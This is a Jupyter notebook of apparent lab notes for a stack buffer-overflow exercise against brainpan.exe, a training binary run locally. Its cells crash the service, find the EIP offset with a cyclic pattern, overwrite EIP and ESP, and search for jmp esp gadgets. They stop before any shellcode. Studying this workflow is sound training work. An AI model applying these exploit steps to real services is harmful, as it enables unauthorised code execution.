{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "32a20618-f056-4062-b4df-6715b1c72748",
   "metadata": {},
   "source": [
    "# Crash Target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43187a78-bbab-408c-ac74-ae4eb6e04123",
   "metadata": {},
   "outputs": [],
   "source": [
    "winedbg brainpan.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f0761546-5868-4820-b142-5e4b8fb7c3b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "python3 -c \"print('1'*9999)\" | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e5bdee27-ae9f-448a-af52-274f101e10eb",
   "metadata": {},
   "source": [
    "# Generate Cyclic Pattern:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "262b2f3e-f04c-42e6-abdb-0c54af24dd8a",
   "metadata": {},
   "outputs": [],
   "source": [
    "ragg2 -P 9999 -r | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a19ba23-4622-4d2a-9ba9-4ec669d7f0db",
   "metadata": {},
   "source": [
    "# Locate EIP Offset:\n",
    "\n",
    "insert EIP addr:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79988c3f-f4b3-44a1-b7dc-7717ab7120b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "ragg2 -q 0x43413243"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a5e504c2-6beb-40e9-a131-ec5f2283898c",
   "metadata": {},
   "source": [
    "# Overwrite EIP and ESP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8fc8550-6958-47f9-9850-279009fec66e",
   "metadata": {},
   "outputs": [],
   "source": [
    "printf \"AAAAAAAAAAA\" > payload-suffix.txt\n",
    "ragg2 -P 524 -r -C payload-suffix.txt | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "624282cc-e5bf-4ec4-b2f0-1265870024f9",
   "metadata": {},
   "source": [
    "# Locate JMPs to ESP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93104a0b-207b-474e-a3d1-5573a42b5408",
   "metadata": {},
   "outputs": [],
   "source": [
    "r2 brainpan.exe\n",
    "/ao jmp esp"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
